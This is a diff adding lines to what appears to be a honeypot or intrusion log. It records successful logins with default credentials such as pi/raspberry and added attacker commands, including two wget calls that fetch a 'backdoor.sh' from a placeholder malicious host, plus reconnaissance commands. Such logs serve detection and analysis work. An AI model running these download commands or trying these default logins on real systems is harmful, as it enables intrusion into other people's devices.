@@ -6,3 +6,10 @@
 2025-05-21T09:51:00 login attempt [SUCCESS] for user pi with password raspberry from 192.168.1.5
 2025-05-21T09:51:05 login attempt [SUCCESS] for user pi with password raspberry from 192.168.1.6
 2025-05-21T09:51:10 login attempt [SUCCESS] for user admin with password 123456 from 192.168.1.7
+
+CMD: ls -la
+CMD: wget http://malicious.site/backdoor.sh
+CMD: uname -a
+CMD: ls -la
+CMD: cd /tmp
+CMD: wget http://malicious.site/backdoor.sh
